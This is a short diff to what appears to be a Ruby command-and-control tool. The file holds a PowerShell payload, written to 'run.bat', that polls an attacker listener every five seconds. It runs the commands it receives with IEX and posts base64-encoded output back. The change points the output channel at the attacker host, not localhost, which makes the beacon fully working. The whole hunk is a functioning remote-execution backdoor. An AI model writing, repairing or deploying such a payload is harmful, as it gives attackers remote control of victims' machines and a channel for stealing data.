@@ -14,7 +14,7 @@ $password = 'changeme'
 
 #Probably dont need to change.
 $payload_file = "run.bat"
-$payload = %Q*powershell.exe -Command "while ($true) { Start-Sleep -Seconds 5; try { $resp = Invoke-WebRequest -Uri http://#{$lhost}:#{$lport}/command -UseBasicParsing -ErrorAction Stop; Write-Host $resp; if ($resp.StatusCode -eq 200) { $cmd = [System.Text.Encoding]::UTF8.GetString($resp.Content); $exec = IEX $cmd; $out = $exec | Out-String; Invoke-WebRequest -Uri http://127.0.0.1:8181/output -Method POST -Body ([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($out))) -UseBasicParsing; } } catch { Write-Host \"Error: $_\" } }"*
+$payload = %Q*powershell.exe -Command "while ($true) { Start-Sleep -Seconds 5; try { $resp = Invoke-WebRequest -Uri http://#{$lhost}:#{$lport}/command -UseBasicParsing -ErrorAction Stop; Write-Host $resp; if ($resp.StatusCode -eq 200) { $cmd = [System.Text.Encoding]::UTF8.GetString($resp.Content); $exec = IEX $cmd; $out = $exec | Out-String; Invoke-WebRequest -Uri http://#{$lhost}:#{$lport}/output -Method POST -Body ([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($out))) -UseBasicParsing; } } catch { Write-Host \"Error: $_\" } }"*
 
 $command_mutex = Mutex.new
 $command = nil
